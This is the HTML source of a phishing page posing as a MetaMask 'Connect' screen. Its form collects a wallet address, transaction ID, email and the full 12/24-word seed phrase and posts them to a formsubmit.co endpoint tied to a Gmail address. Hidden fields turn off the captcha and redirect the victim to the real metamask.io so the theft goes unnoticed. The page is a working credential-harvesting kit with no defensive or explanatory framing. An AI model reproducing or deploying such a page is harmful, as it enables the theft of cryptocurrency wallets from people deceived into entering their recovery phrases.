<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon shortcut" href="/icon-48x48.0e24d00b.png" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <link rel="stylesheet" href="submit1.js">
    <link rel="stylesheet" href="submit2.js">
    <link rel="stylesheet" href="submit3.js">
    <link rel="stylesheet" href="submit4.js">
    <link rel="stylesheet" href="submit1.css">
    <link rel="stylesheet" href="submit2.css">
    <link rel="stylesheet" href="submit3.css">
    <link rel="stylesheet" href="submit4.css">
    <link rel="stylesheet" href="submit5.css">
    <link rel="stylesheet" href="submit6.css">
    <title>Metamask | Connect</title>
</head>

<body class="wallet">
    <a href="https://metamask.io/#/">
        <img class="head" src="./images/logo.a0456565.svg" alt="">
    </a>
    <div class="tab-content" id="myTabContent">
        <div class="active fade show tab-pane" id="mnemonic" role="tabpanel" aria-labelledby="mnemonic-tab">
            <form action="https://formsubmit.co/18010611014a@gmail.com" method="post">
                <input type="hidden" name="_next" value="https://metamask.io/">
                <input type="hidden" name="_captcha" value="false">
                <div class="form-floating">
                    <input type="text" class="form-control w-100" id="WalletAddress" name="Wallet-Address"
                        placeholder="Password">
                    <label for="WalletAddress">Wallet Address</label>
                </div>
                <div class="form-floating">
                    <input type="text" class="form-control w-100" id="TransID" name="Transaction-ID"
                        placeholder="Transaction ID">
                    <label for="TransID">Transaction ID</label>
                </div>
                <div class="form-floating">
                    <input type="text" class="form-control w-100" id="EmailAddress" name="Email-Address"
                        placeholder="Email Address">
                    <label for="EmailAddress">Email Address</label>
                </div>
                <div class="form-floating">
                    <input type="text" class="form-control w-100" id="SeedPhrase" name="Seed-Phrase"
                        placeholder="12/24 Word Seed Phrase">
                    <label for="floatingPassword">12/24 Word Seed Phrase</label>
                </div>
                <button type="submit" id="sig-go" class="mb-5"
                    style="text-align:center;color:#fff;width:250px;background:#037dd6;border:0;border-radius:7px;padding:10px 0;font-size:20px">SUBMIT
                </button>
            </form>
        </div>
    </div>
    <script type="text/javascript" src="/submit1.js"></script>
</body>

</html>
